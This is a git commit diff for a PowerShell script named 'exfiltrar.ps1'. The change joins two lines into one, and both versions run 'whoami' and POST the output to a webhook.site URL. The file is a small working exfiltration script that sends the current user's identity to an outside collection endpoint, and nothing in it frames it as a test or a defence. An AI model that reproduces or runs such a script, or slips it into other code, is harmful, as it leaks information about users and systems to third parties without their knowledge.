f603a4bd101c9ba7746e353f9e68af1d5db4a57e
mery-white14 <62634892+mery-white14@users.noreply.github.com>
2026-05-17 10:14:53 -0600

    Update exfiltrar.ps1

--- exfiltrar.ps1
+++ exfiltrar.ps1
@@ -1,2 +1,1 @@
-$info = whoami
-Invoke-RestMethod -Uri "https://webhook.site/7422bad4-b2c7-4886-9f4d-518c904adc29" -Method Post -Body $info
+$info = whoami; Invoke-RestMethod -Uri "https://webhook.site/7422bad4-b2c7-4886-9f4d-518c904adc29" -Method Post -Body $info
